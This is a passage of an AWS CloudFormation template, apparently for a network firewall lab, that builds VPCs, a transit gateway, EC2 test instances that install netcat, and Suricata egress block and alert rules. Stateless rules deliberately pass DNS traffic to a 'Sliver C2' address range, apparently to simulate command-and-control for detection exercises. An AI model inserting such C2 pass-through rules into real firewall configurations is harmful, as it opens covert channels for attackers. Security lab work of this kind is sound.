            if echo "$tags" | grep -q "privatelink-candidate"; then
              echo "$bucket"
              break
            fi
          done)
          
          # Wait for certificate to be uploaded to S3 (retry up to 30 times with 10 second intervals)
          CERT_DOWNLOADED=false
          for i in {1..30}; do
            if [ -n "$BUCKET_NAME" ] && aws s3 cp s3://$BUCKET_NAME/tls-certs/ca.cert.pem /etc/pki/ca-trust/source/anchors/ca.cert.pem 2>/dev/null; then
              echo "Certificate downloaded successfully"
              CERT_DOWNLOADED=true
              break
            fi
            echo "Waiting for certificate to be available in S3... attempt $i"
            sleep 10
          done
          
          if [ "$CERT_DOWNLOADED" = "true" ]; then
            update-ca-trust extract
            
            # Configure curl to use the system CA bundle
            echo 'export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt' >> /etc/profile.d/curl-ca-bundle.sh
            chmod +x /etc/profile.d/curl-ca-bundle.sh
            export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt
          else
            echo "WARNING: Certificate not available after 30 attempts. Continuing without TLS inspection certificate."
          fi

  DevVPC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "10.2.0.0/16"
      EnableDnsSupport: "true"
      EnableDnsHostnames: "true"
      InstanceTenancy: default
      Tags:
        - Key: Name
          Value: !Sub "dev-vpc-${AWS::StackName}"

  DevVPCWorkloadSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: DevVPC
      CidrBlock: "10.2.1.0/24"
      AvailabilityZone:
        Ref: AvailabilityZoneSelection
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: !Sub "dev-vpc-workload-${AWS::StackName}"

  DevVPCTGWSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: DevVPC
      CidrBlock: "10.2.0.0/28"
      AvailabilityZone:
        Ref: AvailabilityZoneSelection
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: !Sub "dev-vpc-tgw-${AWS::StackName}"

  DevVPCEndpointSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
        GroupDescription: Allow instances to get to SSM Systems Manager
        VpcId: !Ref DevVPC
        SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 10.2.0.0/16
          Description: "Allow HTTPS traffic from Dev VPC for SSM access"
  DevVPCSSMEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref DevVPCEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssm"
        SubnetIds: 
          - !Ref DevVPCWorkloadSubnet
        VpcEndpointType: Interface
        VpcId: !Ref DevVPC

  DevVPCEC2MessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref DevVPCEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ec2messages"
        SubnetIds: 
          - !Ref DevVPCWorkloadSubnet
        VpcEndpointType: Interface
        VpcId: !Ref DevVPC

  DevVPCSSMMessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref DevVPCEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssmmessages"
        SubnetIds: 
          - !Ref DevVPCWorkloadSubnet
        VpcEndpointType: Interface
        VpcId: !Ref DevVPC

  DevVPCRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "dev-vpc-role-${AWS::StackName}"
      Path: "/"
      ManagedPolicyArns:
        - 'arn:aws:iam::aws:policy/AmazonSSMFullAccess'
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole
      Policies:
        - PolicyName: PrivateLinkCandidatePolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: "Allow"
                Action:
                  - "s3:ListAllMyBuckets"
                  - "s3:GetBucketTagging"
                Resource: "*"
              - Effect: "Allow"
                Action:
                  - "s3:ListBucket"
                  - "s3:GetObject"
                  - "s3:PutObject"
                Resource:
                  - !GetAtt PrivateLinkCandidateS3Bucket.Arn
                  - !Sub "${PrivateLinkCandidateS3Bucket.Arn}/*"
              - Effect: "Allow"
                Action:
                  - "dynamodb:PutItem"
                  - "dynamodb:GetItem"
                  - "dynamodb:Query"
                  - "dynamodb:Scan"
                Resource: !GetAtt PrivateLinkCandidateDynamoDBTable.Arn

  DevVPCInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: "/"
      Roles:
        - !Ref DevVPCRole
        
  DevVPCSecGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: "ICMP access from 10.0.0.0/8 and inspection VPC"
      GroupName: !Sub "dev-vpc-sec-group-${AWS::StackName}"
      VpcId: !Ref DevVPC
      SecurityGroupIngress:
        - IpProtocol: icmp
          CidrIp: 10.0.0.0/8
          Description: "Allow traffic from private networks"
          FromPort: "-1"
          ToPort: "-1"
        - IpProtocol: icmp
          CidrIp: 172.16.0.0/24
          Description: "Allow traffic from inspection VPC"
          FromPort: "-1"
          ToPort: "-1"
      SecurityGroupEgress:
        - CidrIp: 0.0.0.0/0
          Description: Allowing outbound connection to 0.0.0.0/0 CIDR.
          IpProtocol: "-1"
          FromPort: -1
          ToPort: -1

  DevVPC1WorkloadInstance1:
    Type: AWS::EC2::Instance
    DependsOn: ProdVPC1WorkloadInstance1
    Properties:
      ImageId: !Ref LatestAmiId
      InstanceType: t2.micro
      IamInstanceProfile: !Ref DevVPCInstanceProfile      
      SubnetId: !Ref DevVPCWorkloadSubnet
      SecurityGroupIds:
        - !Ref DevVPCSecGroup
      Tags:
        - Key: Name
          Value: "DEV - Test Instance"
      UserData:
        Fn::Base64: |
          #!/bin/bash -ex

          # Update system
          sudo yum update -y

          # Install MySQL Client
          sudo wget https://dev.mysql.com/get/mysql80-community-release-el9-1.noarch.rpm
          sudo dnf install mysql80-community-release-el9-1.noarch.rpm -y
          sudo rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2023
          sudo dnf install mysql-community-client -y
          sudo yum install -y nc

          # Install cronie
          sudo dnf install cronie -y

          # Start and enable crond service
          sudo systemctl start crond
          sudo systemctl enable crond

          # Create a script for DNS cache flush
          cat << 'EOF' | sudo tee /usr/local/bin/flush-dns-cache.sh
          #!/bin/bash
          systemctl restart systemd-resolved
          EOF

          # Make the script executable
          sudo chmod +x /usr/local/bin/flush-dns-cache.sh

          # Add cron job to run every minute
          echo "* * * * * root /usr/local/bin/flush-dns-cache.sh" | sudo tee /etc/cron.d/flush-dns-cache

          # Set proper permissions for the cron job file
          sudo chmod 644 /etc/cron.d/flush-dns-cache

          # Download TLS inspection CA certificate from S3 and update trust store
          yum install ca-certificates -y
          update-ca-trust force-enable
          
          # Get the S3 bucket name using tags
          BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[].Name" --output text | xargs -n1 | while read bucket; do
            tags=$(aws s3api get-bucket-tagging --bucket "$bucket" 2>/dev/null || echo "")
            if echo "$tags" | grep -q "privatelink-candidate"; then
              echo "$bucket"
              break
            fi
          done)
          
          # Wait for certificate to be uploaded to S3 (retry up to 30 times with 10 second intervals)
          CERT_DOWNLOADED=false
          for i in {1..30}; do
            if [ -n "$BUCKET_NAME" ] && aws s3 cp s3://$BUCKET_NAME/tls-certs/ca.cert.pem /etc/pki/ca-trust/source/anchors/ca.cert.pem 2>/dev/null; then
              echo "Certificate downloaded successfully"
              CERT_DOWNLOADED=true
              break
            fi
            echo "Waiting for certificate to be available in S3... attempt $i"
            sleep 10
          done
          
          if [ "$CERT_DOWNLOADED" = "true" ]; then
            update-ca-trust extract
            
            # Configure curl to use the system CA bundle
            echo 'export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt' >> /etc/profile.d/curl-ca-bundle.sh
            chmod +x /etc/profile.d/curl-ca-bundle.sh
            export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt
          else
            echo "WARNING: Certificate not available after 30 attempts. Continuing without TLS inspection certificate."
          fi

# Centralized egress VPC
  EgressVPC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "172.16.0.0/24"
      EnableDnsSupport: "true"
      EnableDnsHostnames: "true"
      InstanceTenancy: default
      Tags:
        - Key: Name
          Value: !Sub "egress-${AWS::StackName}"

  SubnetCTGW:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "172.16.0.0/28"
      AvailabilityZone:
        Ref: AvailabilityZoneSelection
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: !Sub "egress-tgw-attachment-${AWS::StackName}"

  SubnetCPublic:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: EgressVPC
      CidrBlock: "172.16.0.16/28"
      AvailabilityZone:
        Ref: AvailabilityZoneSelection
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: !Sub "egress-public-${AWS::StackName}"

  EgressInternetGateway:
    Type: AWS::EC2::InternetGateway
    Properties:
      Tags:
        - Key: Name
          Value: !Sub "egress-igw-${AWS::StackName}"

  AttachEgressGateway:
    Type: AWS::EC2::VPCGatewayAttachment
    Properties:
      VpcId:
        !Ref EgressVPC
      InternetGatewayId:
        !Ref EgressInternetGateway

  SubnetCNATEIP:
    Type: "AWS::EC2::EIP"
    Properties:
      Domain: vpc

  SubnetCNATGateway:
    Type: "AWS::EC2::NatGateway"
    Properties:
      AllocationId:
        Fn::GetAtt:
          - SubnetCNATEIP
          - AllocationId
      SubnetId:
        Ref: SubnetCPublic
      Tags:
        - Key: Name
          Value: !Sub "egress-natgw-${AWS::StackName}"


# Transit Gateway
  CentralTransitGateway:
    Type: "AWS::EC2::TransitGateway"
    Properties:
      AmazonSideAsn: 65000
      Description: "TGW Network Firewall Demo"
      AutoAcceptSharedAttachments: "disable"
      DefaultRouteTableAssociation: "disable"
      DefaultRouteTablePropagation: "disable"
      DnsSupport: "enable"
      VpnEcmpSupport: "enable"
      Tags:
        - Key: Name
          Value: !Sub "tgw-${AWS::StackName}"

  AttachProdVPC:
    Type: "AWS::EC2::TransitGatewayAttachment"
    Properties:
      SubnetIds: 
        - !Ref ProdVPCTGWSubnet
      Tags:
        - Key: Name
          Value: !Sub "prod-vpc-attach-${AWS::StackName}"
      TransitGatewayId: !Ref CentralTransitGateway
      VpcId: !Ref ProdVPC

  AttachDevVPC:
    Type: "AWS::EC2::TransitGatewayAttachment"
    Properties:
      SubnetIds: 
        - !Ref DevVPCTGWSubnet
      Tags:
        - Key: Name
          Value: !Sub "dev-vpc-attach-${AWS::StackName}"
      TransitGatewayId: !Ref CentralTransitGateway
      VpcId: !Ref DevVPC


  AttachEgressVPC:
    Type: "AWS::EC2::TransitGatewayAttachment"
    Properties:
      SubnetIds: 
        - !Ref SubnetCTGW
      Options:
        ApplianceModeSupport: enable
      Tags:
        - Key: Name
          Value: !Sub "egress-attach-${AWS::StackName}"
      TransitGatewayId: !Ref CentralTransitGateway
      VpcId: !Ref EgressVPC

  AttachPublicInternetVPC:
    Type: "AWS::EC2::TransitGatewayAttachment"
    Properties:
      SubnetIds: 
        - !Ref PublicInternetTGWSubnet
      Tags:
        - Key: Name
          Value: !Sub "public-internet-attach-${AWS::StackName}"
      TransitGatewayId: !Ref CentralTransitGateway
      VpcId: !Ref PublicInternetVPC
 

  StatelessRuleGroup:
    Type: AWS::NetworkFirewall::RuleGroup
    Properties:
      RuleGroupName: StatelessRuleGroup-DO-NOT-EDIT
      Type: STATELESS
      Capacity: 100
      RuleGroup:
        RulesSource:
          StatelessRulesAndCustomActions:
            StatelessRules:
              # Rule 1: Pass DNS queries from R53 Resolver Endpoint IP 1 to Sliver C2
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.1.1.20/32"
                    Destinations:
                      - AddressDefinition: "10.200.1.0/24"
                    SourcePorts:
                      - FromPort: 1024
                        ToPort: 65535
                    DestinationPorts:
                      - FromPort: 53
                        ToPort: 53
                    Protocols:
                      - 17
                  Actions:
                    - "aws:pass"
                Priority: 1
              # Rule 2: Pass DNS queries from R53 Resolver Endpoint IP 2 to Sliver C2
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.1.1.21/32"
                    Destinations:
                      - AddressDefinition: "10.200.1.0/24"
                    SourcePorts:
                      - FromPort: 1024
                        ToPort: 65535
                    DestinationPorts:
                      - FromPort: 53
                        ToPort: 53
                    Protocols:
                      - 17
                  Actions:
                    - "aws:pass"
                Priority: 2
              # Rule 3: Pass DNS responses from Sliver C2 back to R53 Resolver Endpoint IP 1
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.200.1.0/24"
                    Destinations:
                      - AddressDefinition: "10.1.1.20/32"
                    SourcePorts:
                      - FromPort: 53
                        ToPort: 53
                    DestinationPorts:
                      - FromPort: 1024
                        ToPort: 65535
                    Protocols:
                      - 17
                  Actions:
                    - "aws:pass"
                Priority: 3
              # Rule 4: Pass DNS responses from Sliver C2 back to R53 Resolver Endpoint IP 2
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.200.1.0/24"
                    Destinations:
                      - AddressDefinition: "10.1.1.21/32"
                    SourcePorts:
                      - FromPort: 53
                        ToPort: 53
                    DestinationPorts:
                      - FromPort: 1024
                        ToPort: 65535
                    Protocols:
                      - 17
                  Actions:
                    - "aws:pass"
                Priority: 4
              # Rule 5: Pass TCP DNS queries from R53 Resolver Endpoint IP 1 to Sliver C2
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.1.1.20/32"
                    Destinations:
                      - AddressDefinition: "10.200.1.0/24"
                    SourcePorts:
                      - FromPort: 1024
                        ToPort: 65535
                    DestinationPorts:
                      - FromPort: 53
                        ToPort: 53
                    Protocols:
                      - 6
                  Actions:
                    - "aws:pass"
                Priority: 5
              # Rule 6: Pass TCP DNS queries from R53 Resolver Endpoint IP 2 to Sliver C2
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.1.1.21/32"
                    Destinations:
                      - AddressDefinition: "10.200.1.0/24"
                    SourcePorts:
                      - FromPort: 1024
                        ToPort: 65535
                    DestinationPorts:
                      - FromPort: 53
                        ToPort: 53
                    Protocols:
                      - 6
                  Actions:
                    - "aws:pass"
                Priority: 6
              # Rule 7: Pass TCP DNS responses from Sliver C2 back to R53 Resolver Endpoint IP 1
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.200.1.0/24"
                    Destinations:
                      - AddressDefinition: "10.1.1.20/32"
                    SourcePorts:
                      - FromPort: 53
                        ToPort: 53
                    DestinationPorts:
                      - FromPort: 1024
                        ToPort: 65535
                    Protocols:
                      - 6
                  Actions:
                    - "aws:pass"
                Priority: 7
              # Rule 8: Pass TCP DNS responses from Sliver C2 back to R53 Resolver Endpoint IP 2
              - RuleDefinition:
                  MatchAttributes:
                    Sources:
                      - AddressDefinition: "10.200.1.0/24"
                    Destinations:
                      - AddressDefinition: "10.1.1.21/32"
                    SourcePorts:
                      - FromPort: 53
                        ToPort: 53
                    DestinationPorts:
                      - FromPort: 1024
                        ToPort: 65535
                    Protocols:
                      - 6
                  Actions:
                    - "aws:pass"
                Priority: 8

  StatefulRuleGroup:
    Type: 'AWS::NetworkFirewall::RuleGroup'
    Properties:
      RuleGroupName: StatefulRuleGroup
      Type: STATEFUL
      Capacity: 100
      RuleGroup:
        RuleVariables: 
          IPSets: 
            DEV_CIDR: 
              Definition: 
                - "10.2.0.0/16"
            PROD_CIDR: 
              Definition: 
                - "10.1.0.0/16"
            PROD_DB: 
              Definition: 
                - "10.1.1.50"
            SANITIZED_PROD_DB: 
              Definition: 
                - "10.1.1.60"
            PROD_INTERNAL_API: 
              Definition: 
                - "10.1.1.100"
        RulesSource:
          RulesString: >-
            # Insert firewall rules 

        StatefulRuleOptions:
          RuleOrder: STRICT_ORDER


  TLSInspectionRuleGroup:
    Type: 'AWS::NetworkFirewall::RuleGroup'
    Properties:
      RuleGroupName: TLS-InspectionRuleGroup
      Type: STATEFUL
      Capacity: 100
      RuleGroup:
        RuleVariables: 
          IPSets: 
            DEV_CIDR: 
              Definition: 
                - "10.2.0.0/16"
            PROD_CIDR: 
              Definition: 
                - "10.1.0.0/16"
            PROD_DB: 
              Definition: 
                - "10.1.1.50"
            SANITIZED_PROD_DB: 
              Definition: 
                - "10.1.1.60"
            PROD_INTERNAL_API: 
              Definition: 
                - "10.1.1.100"
        RulesSource:
          RulesString: >-
            # Insert firewall rules 

        StatefulRuleOptions:
          RuleOrder: STRICT_ORDER


# Firewalls
  EgressAllowListExampleRuleGroup:
    Type: 'AWS::NetworkFirewall::RuleGroup'
    Properties:
      RuleGroupName: egress-allow-list-example-rule-group
      Type: STATEFUL
      RuleGroup:
        RulesSource:
          RulesString: |
            # This is a "Strict rule ordering" egress security template meant only for the egress use case.
            # Do NOT use with "Drop All" or "Drop Established"
            # Visit https://aws.github.io/aws-security-services-best-practices/guides/network-firewall/ for all the best practices
            
            # Block, but do not log any ingress traffic
            drop ip any any -> $HOME_NET any (msg:"Ingress traffic to HOME_NET Blocked"; flow:to_server; sid:98228398;)

            # Silently allow TCP 3-way handshake to be setup by $HOME_NET clients
            pass tcp $HOME_NET any -> any any (flow:not_established, to_server; msg:"pass rules do not alert/log"; sid:9918156;)
            pass tcp any any -> $HOME_NET any (flow:not_established, to_client; msg:"pass rules do not alert/log"; sid:9918199;)

            # Silently (do not log) allow low risk protocols out to anywhere
            pass ntp $HOME_NET any -> any 123 (flow:to_server; msg:"pass rules do not alert/log"; sid:9829158;)

            # Alert on risky geos
            alert ip $HOME_NET any -> any any (msg:"Egress traffic to RU"; flow:to_server; geoip:dst,RU; metadata:geo RU; sid:8733172;)
            alert ip $HOME_NET any -> any any (msg:"Egress traffic to CN"; flow:to_server; geoip:dst,CN; metadata:geo CN; sid:873381;)

            # Block high risk TLDs
            reject tls $HOME_NET any -> any any (tls.sni; content:".ru"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:20233181;)
            reject http $HOME_NET any -> any any (http.host; content:".ru"; msg:"High risk TLD blocked"; flow:to_server; sid:20235181;)
            reject tls $HOME_NET any -> any any (tls.sni; content:".xyz"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:20232181;)
            reject http $HOME_NET any -> any any (http.host; content:".xyz"; msg:"High risk TLD blocked"; flow:to_server; sid:20235281;)
            reject tls $HOME_NET any -> any any (tls.sni; content:".info"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:10233181;)
            reject http $HOME_NET any -> any any (http.host; content:".info"; msg:"High risk TLD blocked"; flow:to_server; sid:10235181;)
            reject tls $HOME_NET any -> any any (tls.sni; content:".onion"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:23233181;)
            reject http $HOME_NET any -> any any (http.host; content:".onion"; msg:"High risk TLD blocked"; flow:to_server; sid:20335181;)

            # Silently (do not log) allow AWS public service endpoints that we have not setup VPC endpoints for yet
            # VPC endpoints are highly encouraged. They reduce NFW data processing costs and allow for additional security features like VPC endpoint policies.
            pass tls $HOME_NET any -> any any (tls.sni; content:"ec2messages."; startswith; nocase; content:".amazonaws.com"; endswith; nocase; flow:to_server; sid:20231181;)
            pass tls $HOME_NET any -> any any (tls.sni; content:"ssm."; startswith; nocase; content:".amazonaws.com"; endswith; nocase; flow:to_server; sid:2023116132;)
            pass tls $HOME_NET any -> any any (tls.sni; content:"ssmmessages."; startswith; nocase; content:".amazonaws.com"; endswith; nocase; flow:to_server; sid:2021110133;)

            # Allow-list of strict FQDNs to silently allow
            pass tls $HOME_NET any -> any any (tls.sni; content:"checkip.amazonaws.com"; startswith; nocase; endswith; flow:to_server; sid:202311893;)
            pass http $HOME_NET any -> any any (http.host; content:"checkip.amazonaws.com"; startswith; endswith; flow:to_server; sid:20236893;)

            # Allow-List of strict FQDNs, but still alert on them
            alert tls $HOME_NET any -> any any (tls.sni; content:"www.example.com"; startswith; nocase; endswith; flow:to_server; msg:"TLS SNI Allowed"; sid:202315893;)
            pass tls $HOME_NET any -> any any (tls.sni; content:"www.example.com"; startswith; nocase; endswith; flow:to_server; msg:"pass rules do not alert/log"; sid:202315873;)

            # Block and log any egress traffic not already allowed above
            # reject TCP traffic for a more graceful block
            reject tls $HOME_NET any -> any any (msg:"Default Egress HTTPS Reject"; ssl_state:client_hello; ja4.hash; content:"_"; flowbits:set,blocked; flow:to_server; sid:999991;)
            alert tls $HOME_NET any -> any any (msg:"X25519Kyber768"; flowbits:isnotset,blocked; flowbits:set,X25519Kyber768; noalert; flow:to_server; sid:999993;)
            reject http $HOME_NET any -> any any (msg:"Default Egress HTTP Reject"; flowbits:set,blocked; flow:to_server; sid:999992;)
            reject tcp $HOME_NET any -> any any (msg:"Default Egress TCP Reject"; flowbits:isnotset,blocked; flowbits:isnotset,X25519Kyber768; flow:to_server; sid:999994;)
            drop udp $HOME_NET any -> any any (msg:"Default Egress UDP Drop"; flow:to_server; sid:999995;)
            drop icmp $HOME_NET any -> any any (msg:"Default Egress ICMP Drop"; flow:to_server; sid:999996;)
            drop ip $HOME_NET any -> any any (msg:"Default Egress IP Drop"; ip_proto:!TCP; ip_proto:!UDP; ip_proto:!ICMP; flow:to_server; sid:999997;)
        StatefulRuleOptions:
          RuleOrder: STRICT_ORDER
      Capacity: 1000
      Description: Example best practice egress allow list rule group

  LogOnlyRuleGroup:
    Type: 'AWS::NetworkFirewall::RuleGroup'
    Properties:
      RuleGroupName: basic-log-rules
      Type: STATEFUL
      RuleGroup:
        RulesSource:
          RulesString: |
            # Visit https://aws.github.io/aws-security-services-best-practices/guides/network-firewall/ for all the best practices

            # Alert on risky geos
            alert ip $HOME_NET any -> any any (msg:"Egress traffic to RU"; flow:to_server; geoip:dst,RU; metadata:geo RU; sid:100001;)
            alert ip $HOME_NET any -> any any (msg:"Egress traffic to CN"; flow:to_server; geoip:dst,CN; metadata:geo CN; sid:100002;)

            # Alert on high risk TLDs
            alert tls $HOME_NET any -> any any (tls.sni; content:".ru"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:100003;)
            alert http $HOME_NET any -> any any (http.host; content:".ru"; msg:"High risk TLD blocked"; flow:to_server; sid:100004;)
            alert tls $HOME_NET any -> any any (tls.sni; content:".xyz"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:100005;)
            alert http $HOME_NET any -> any any (http.host; content:".xyz"; msg:"High risk TLD blocked"; flow:to_server; sid:100006;)
            alert tls $HOME_NET any -> any any (tls.sni; content:".info"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:100007;)
            alert http $HOME_NET any -> any any (http.host; content:".info"; msg:"High risk TLD blocked"; flow:to_server; sid:100008;)
            alert tls $HOME_NET any -> any any (tls.sni; content:".onion"; nocase; msg:"High risk TLD blocked"; flow:to_server; sid:100009;)
            alert http $HOME_NET any -> any any (http.host; content:".onion"; msg:"High risk TLD blocked"; flow:to_server; sid:1000010;)

            # Alert on specific protocols
            alert icmp any any -> any any (msg:"Alert on ping"; sid:1000011;)
            alert http any any -> any any (msg:"Alert on http"; sid:1000012;)
            alert tls any any -> any any (msg:"Alert on tls (https)"; sid:1000013;)
            alert ssh any any -> any any (msg:"Alert on ssh"; sid:1000014;)
        StatefulRuleOptions:
          RuleOrder: STRICT_ORDER
      Capacity: 100
      Description: Simple rule group to log specific protocols, used to showcase default firewall behavior without any drop/pass rules. 

  EgressFirewallPolicy:
    Type: AWS::NetworkFirewall::FirewallPolicy
    Properties:
      FirewallPolicyName: "egress-and-east-west-firewall-policy"
      FirewallPolicy:
        StatelessDefaultActions:
          - 'aws:forward_to_sfe'
        StatelessFragmentDefaultActions:
          - 'aws:forward_to_sfe'
        StatefulDefaultActions:
          - 'aws:alert_established_app_layer'
        StatelessRuleGroupReferences:
          - ResourceArn: !Ref StatelessRuleGroup
            Priority: 1
        StatefulRuleGroupReferences:
          - ResourceArn: !Ref StatefulRuleGroup
            Priority: 100
        StatefulEngineOptions:
          RuleOrder: STRICT_ORDER
          StreamExceptionPolicy: REJECT
        PolicyVariables:
          RuleVariables:
            HOME_NET:
              Definition:
                - 10.0.0.0/8
                - 172.16.0.0/12
                - 192.168.0.0/16
      Tags:
        - Key: Name
          Value: "egress-and-east-west-firewall-policy"

  EgressFirewall:
    Type: AWS::NetworkFirewall::Firewall
    Properties:
      FirewallName: "egress-and-east-west-firewall"
      EnabledAnalysisTypes: 
        - TLS_SNI
        - HTTP_HOST
      FirewallPolicyArn: !Ref EgressFirewallPolicy
      TransitGatewayId: !Ref CentralTransitGateway
      AvailabilityZoneMappings: 
        - AvailabilityZone: !GetAtt SubnetCTGW.AvailabilityZoneId
      Tags:
        - Key: Name
          Value: "egress-and-east-west-firewall"

  EgressFirewallLogFlowGroup:
    Type: AWS::Logs::LogGroup
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption"
    Properties:
      LogGroupName: "/network-firewall/flow-logs"
      RetentionInDays: 30

  EgressFirewallLogAlertGroup:
    Type: AWS::Logs::LogGroup
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption"
    Properties:
      LogGroupName: "/network-firewall/alert-logs"
      RetentionInDays: 30
    
  EgressFirewallLog:
    Type: AWS::NetworkFirewall::LoggingConfiguration
    Properties:
      FirewallArn: !Ref EgressFirewall
      LoggingConfiguration:
        LogDestinationConfigs:
          - LogType: FLOW
            LogDestinationType: CloudWatchLogs
            LogDestination:
              logGroup: "/network-firewall/flow-logs"
          - LogType: ALERT
            LogDestinationType: CloudWatchLogs
            LogDestination:
              logGroup: "/network-firewall/alert-logs"
          - LogType: TLS
            LogDestinationType: CloudWatchLogs
            LogDestination:
              logGroup: "/network-firewall/tls-logs"
# Route Tables
  ProdVPCWorkloadRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref ProdVPC
      Tags:
        - Key: Name
          Value: !Sub "prod-vpc-workload-route-table-${AWS::StackName}"

  ProdVPCWorkloadRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    DependsOn: ProdVPCWorkloadSubnet
    Properties:
      RouteTableId: !Ref ProdVPCWorkloadRouteTable
      SubnetId: !Ref ProdVPCWorkloadSubnet

  ProdVPCWorkloadDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachProdVPC
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayId: !Ref CentralTransitGateway
      RouteTableId: !Ref ProdVPCWorkloadRouteTable
 
  DevVPCWorkloadRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref DevVPC
      Tags:
        - Key: Name
          Value: !Sub "dev-vpc-workload-route-table-${AWS::StackName}"

  DevVPCWorkloadRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    DependsOn: DevVPCWorkloadSubnet
    Properties:
      RouteTableId: !Ref DevVPCWorkloadRouteTable
      SubnetId: !Ref DevVPCWorkloadSubnet

  DevVPCWorkloadInternalRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachDevVPC
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      TransitGatewayId: !Ref CentralTransitGateway
      RouteTableId: !Ref DevVPCWorkloadRouteTable

  # Dedicated route tables for TGW subnets
  ProdVPCTGWRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref ProdVPC
      Tags:
        - Key: Name
          Value: !Sub "prod-vpc-tgw-route-table-${AWS::StackName}"

  ProdVPCTGWRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    DependsOn: ProdVPCTGWSubnet
    Properties:
      RouteTableId: !Ref ProdVPCTGWRouteTable
      SubnetId: !Ref ProdVPCTGWSubnet

  DevVPCTGWRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref DevVPC
      Tags:
        - Key: Name
          Value: !Sub "dev-vpc-tgw-route-table-${AWS::StackName}"

  DevVPCTGWRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    DependsOn: DevVPCTGWSubnet
    Properties:
      RouteTableId: !Ref DevVPCTGWRouteTable
      SubnetId: !Ref DevVPCTGWSubnet

  # TGW attachment subnet routes through inspection VPC
  SubnetCTGWRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref EgressVPC
      Tags:
        - Key: Name
          Value: !Sub "inspection-tgw-route-table-${AWS::StackName}"
          
  SubnetCTGWRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    DependsOn: SubnetCTGW
    Properties:
      RouteTableId: !Ref SubnetCTGWRouteTable
      SubnetId: !Ref SubnetCTGW

  # Route spoke traffic through NAT Gateway
  SubnetCTGWDefaultRoute:
    Type: AWS::EC2::Route
    DependsOn: SubnetCNATGateway
    Properties:
      DestinationCidrBlock: "0.0.0.0/0"
      NatGatewayId: !Ref SubnetCNATGateway
      RouteTableId: !Ref SubnetCTGWRouteTable

  # Public subnet routes corporate traffic to TGW, internet to IGW
  SubnetCPublicRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref EgressVPC
      Tags:
